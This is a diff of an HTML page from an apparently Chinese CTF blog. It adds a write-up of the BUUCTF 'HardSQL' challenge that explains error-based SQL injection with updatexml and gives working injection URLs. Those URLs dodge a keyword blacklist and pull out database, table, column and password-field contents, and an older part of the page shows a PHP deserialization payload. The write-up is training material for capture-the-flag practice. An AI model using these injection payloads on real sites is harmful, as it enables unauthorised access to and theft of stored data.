@@ -172,12 +172,12 @@
             
             <span class="tag">
                 
-                <a href="/tags/ctf/" style="color: #ffa2c4">ctf</a>
+                <a href="/tags/ctf/" style="color: #ff7d73">ctf</a>
             </span>
             
             <span class="tag">
                 
-                <a href="/tags/web/" style="color: #ffa2c4">web</a>
+                <a href="/tags/web/" style="color: #ff7d73">web</a>
             </span>
             
         </span>
@@ -429,7 +429,41 @@ echo serialize(new Flag());
 <p><code>?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306051740188.png" alt="image-20230605174017012"></p>
 <p>查看源码即可得到flag</p>
-<h3 id="2023-6-6-极客大挑战-2019-HardSQL"><a href="#2023-6-6-极客大挑战-2019-HardSQL" class="headerlink" title="2023.6.6 [极客大挑战 2019]HardSQL"></a>2023.6.6 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL">[极客大挑战 2019]HardSQL</a></h3>
+<h3 id="2023-6-6-极客大挑战-2019-HardSQL"><a href="#2023-6-6-极客大挑战-2019-HardSQL" class="headerlink" title="2023.6.6 [极客大挑战 2019]HardSQL"></a>2023.6.6 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL">[极客大挑战 2019]HardSQL</a></h3><p>跟之前做的sql差不多，这次开始尝试发现是应该是黑名单，fuzz后发现一些常用的关键字都被屏蔽了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061431006.png" alt="image-20230606143116441">比如and，空格，union，sleep等，看下来报错注入的几个函数如updatexml，extractvalue，floor都还在，应该可以用报错注入，尝试绕过</p>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061413649.png" alt="image-20230606141333756"></p>
+<h4 id="先复习一下报错注入"><a href="#先复习一下报错注入" class="headerlink" title="先复习一下报错注入"></a>先复习一下报错注入</h4><p>在MySQL5.1版本后加入了对XML文档进行查询和修改的两个函数： <code>updatexml()</code>,<code>extractvalue()</code></p>
+<p>当这两个函数在执行时，如果出现xml文档路径错误就会产生报错。</p>
+<p><code>updatexml(XML_document, Xpath_string, new_value)</code>：</p>
+<ul>
+<li>是一个使用不同xml标记匹配和替换xml块的函数。</li>
+<li>可以改变文档中符合条件的节点的值</li>
+<li>第一个参数是xml文档对象的名称，第二个参数是Xpath格式的路径，第三个参数是替换查找到符合条件的数据</li>
+<li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li>
+</ul>
+<p>XML文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…格式，如果写入其他格式（并不是所有除了&#x2F;xxx&#x2F;xxx&#x2F;xxx的格式都会报错，有些字符会报错），会报错，并且会返回32位我们写入的非法格式内容</p>
+<p>其他几个原理大致差不多，floor是为了让group by报错，我之前的文章有写。</p>
+<p>回到本题中</p>
+<p>首先查库</p>
+<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,database()),1))%23&amp;password=123 
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061522163.png" alt="image-20230606152211246"></p>
+<p>然后查表</p>
+<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(table_name)from(information_schema.tables)where(table_schema)like(database()))),1))%23&amp;password=123
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061522905.png" alt="image-20230606152231034"></p>
+<p>查列</p>
+<pre><code class="mysql">/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(%27H4rDsq1%27))),1))%23&amp;password=123
+</code></pre>
+<p><img src="https://cdn.jsdelivr.net/gh/fc235/Images@main/img/202306061529262.png" alt="image-20230606152955203"></p>
+<p>最后查数据，id没查出来，username是flag，flag就在password中，但是由于太长无法显示，所以分多次来查询</p>
+<pre><code class="mysql">#前半部分
+/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(password))from(H4rDsq1))),1))%23&amp;password=123
+#后半部分
+/check.php?username=admin&#39;or(updatexml(1,concat(1,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23&amp;password=123
+</code></pre>
+<p>拼接起来就是完整的flag了</p>
+<h3 id="2023-6-7-网鼎杯-2020-朱雀组-Think-Java"><a href="#2023-6-7-网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="2023.6.7 [网鼎杯 2020 朱雀组]Think Java"></a>2023.6.7 <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Think%20Java">[网鼎杯 2020 朱雀组]Think Java</a></h3>
     </div>
     
     
